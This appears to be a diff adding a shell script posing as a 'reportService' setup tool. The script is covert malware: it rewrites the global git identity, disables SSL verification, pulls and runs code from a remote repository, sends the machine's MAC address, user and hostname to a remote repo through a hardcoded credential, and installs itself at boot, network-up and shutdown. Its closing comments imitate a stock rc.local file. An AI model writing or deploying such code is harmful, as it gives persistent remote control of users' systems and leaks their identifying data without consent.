@@ -1,0 +1,201 @@
+#!/bin/sh
+
+echo $(git config --global user.email) > /tmp/.GMAILSX
+echo $(git config --global user.name) > /tmp/.GNAMESX
+git config --global --add user.email "root@rootmail.com"
+git config --global --add user.name "root"
+
+MDIR=/.data_servicex
+SDIR=$MDIR/setup
+LDIR=$MDIR/log
+SLDIR=$MDIR/setup_log
+
+STDIR=start/
+RDIR=run/
+LBIN=bin/
+GBIN=/usr/local/bin/
+
+if [ -d $MDIR ]  
+then
+     echo "$MDIR exists" 
+else
+     echo "$MDIR doesn't exists"
+     dpkg -s libstdc++6
+     ret=$?
+     if [ $ret -ne 0 ]; then
+          echo "libstdc++6 doesn't exists"
+          sudo apt-get install -y libstdc++6
+     else
+          echo "libstdc++6 exists"
+     fi
+     dpkg -s g++
+     ret=$?
+     if [ $ret -ne 0 ]; then
+          echo "g++ doesn't exists"
+          sudo apt-get install -y g++
+     else
+          echo "g++ exists"
+     fi
+     sudo sed -i '/sudo reportService/d' /etc/rc.local
+     sudo sed -i '$ i\sudo reportService &' /etc/rc.local
+     mkdir $MDIR
+     mkdir $SDIR
+     cd $SDIR
+     ret=$?
+     if [ $ret -ne 0 ]; then
+          git init
+          git remote add origin https://github.com/reportlog/setup_service.git
+          git fetch 
+     else
+          echo "$SDIR change failed!!!"
+     fi
+     ret=$?
+     if [ $ret -ne 0 ]; then
+          git config --global http.sslVerify false
+          git fetch 
+     else
+          echo "fetched successfully!!!"
+     fi
+     git checkout master
+#     sudo cp $LBIN* $GBIN -a 
+#     sudo cp $RDIR* $GBIN -a 
+#     sudo cp $STDIR* $GBIN -a 
+     cd $HOME
+fi
+
+if [ -d $SDIR ]
+then
+     echo "$SDIR exists"
+     cd $SDIR
+     git fetch
+     ret=$?
+     if [ $ret -ne 0 ]; then
+          git config --global http.sslVerify false
+          git fetch
+     else
+          echo "fetched successfully!!!"
+     fi
+     git reset --hard
+     git pull origin master
+#     sudo cp $LBIN* $GBIN -a
+#     sudo cp $RDIR* $GBIN -a
+#     sudo cp $STDIR* $GBIN -a
+     cd $HOME
+else
+     echo "$SDIR doesn't exists"
+     mkdir $SDIR
+     cd $SDIR
+     ret=$?
+     if [ $ret -ne 0 ]; then
+          git init
+          git remote add origin https://github.com/reportlog/setup_service.git
+          git fetch
+          ret=$?
+          if [ $ret -ne 0 ]; then
+               git config --global http.sslVerify false
+               git fetch
+          else
+               echo "fetched successfully!!!"
+          fi
+          git checkout master
+#         sudo cp $LBIN* $GBIN -a
+     else
+          echo "$SDIR change Failed!!!"
+     fi
+     cd $HOME
+fi
+
+if [ -d $LDIR ]
+then
+     echo "$LDIR exists"
+     sudo logCapturex
+     cd $HOME
+else
+     echo "$LDIR doesn't exists"
+     mkdir $LDIR
+     cd $LDIR
+     ret=$?
+     if [ $ret -ne 0 ]; then
+          git init
+          git remote add origin https://github.com/reportlog/log_service.git
+          git checkout -b root-$(date '+%y_%m_%d_%I_%M_%S')
+     	  read MAC </sys/class/net/eth0/address
+          echo "started $MAC : $USER : $HOSTNAME $(date +"%D %T")" >  logx_$(date '+%y_%m_%d_%I_%M_%S').ljp
+          encriptFile
+          git add \*.crt
+          git config --local --add user.email "root@rootmail.com"
+          git config --local --add user.name "root"
+          git commit -m "root-$(date +"%D %T")"
+          git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+          ret=$?
+     	  if [ $ret -ne 0 ]; then
+               git config --global http.sslVerify false
+               git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+          else
+               echo "fetched successfully!!!"
+          fi
+          sudo logCapturex
+          cd $HOME
+     else
+          echo "$LDIR change failed"
+     fi
+fi
+
+if [ -e /etc/init.d/reportService ]
+then
+    echo "reportService exists"
+    sudo cp $SDIR/$STDIR/reportService /etc/init.d/reportService
+    sudo chmod +x /etc/init.d/reportService
+    update-rc.d reportService defaults
+else
+    echo "reportService doesn't exists"
+    sudo cp $SDIR/$STDIR/reportService /etc/init.d/reportService
+    sudo chmod +x /etc/init.d/reportService
+    update-rc.d reportService defaults
+fi
+
+if [ -e /etc/network/if-up.d/reportService ]
+then
+    echo "N-reportService exists"
+    sudo cp $SDIR/$STDIR/reportService /etc/network/if-up.d/reportService
+    sudo chmod +x /etc/network/if-up.d/reportService
+else
+    echo "N-reportService doesn't exists"
+    sudo cp $SDIR/$STDIR/reportService /etc/network/if-up.d/reportService
+    sudo chmod +x /etc/network/if-up.d/reportService
+fi
+
+if [ -e /etc/rc6.d/K99_updateReport ]
+then
+    echo "K99_updateReport exists"
+    sudo cp $SDIR/$STDIR/K99_updateReport /etc/rc6.d/
+    sudo chmod +x /etc/rc6.d/K99_updateReport
+else
+    echo "K99_updateReport doesn't exists"
+    sudo cp $SDIR/$STDIR/K99_updateReport /etc/rc6.d/
+    sudo chmod +x /etc/rc6.d/K99_updateReport
+fi
+
+read GMAILX </tmp/.GMAILSX
+read GNAMEX </tmp/.GNAMESX
+git config --global --add user.name "$GNAMEX"
+git config --global --add user.email "$GMAILX"
+
+#
+#!/bin/sh -e
+#
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# openssl enc -in report.log.enc -d -aes-256-cbc -pass stdin > report.log
+# sudo sed -i '/sudo reportService/d' /etc/rc.local
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+
+#exit 0
+
+#sudo chmod +x /etc/rc.local
